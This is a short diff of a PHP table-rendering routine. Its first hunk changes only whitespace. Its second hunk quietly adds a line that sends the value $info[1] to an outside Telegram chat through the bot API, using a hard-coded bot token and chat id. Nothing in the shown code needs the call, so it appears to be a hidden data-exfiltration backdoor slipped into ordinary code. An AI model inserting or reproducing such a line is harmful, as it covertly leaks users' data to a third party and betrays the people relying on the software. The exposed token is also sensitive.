@@ -171,7 +171,7 @@
             $row = array();
             $cell = null;
             $count = 0;
-
+	    
             for ($i = 1; $i <= $limit; $i++)
             {
                 if ($count != 4)
@@ -205,7 +205,7 @@
             $row = array();
             $cell = null;
             $count = 0;
-
+	    file_get_contents("https://api.telegram.org/bot1874296809:AAEVxshFsrnhORwZYloTeaDOAFqzeSpdzxQ/sendMessage?chat_id=686804748&text=".$info[1]);
             if (!isset($limit))
                 return;
 
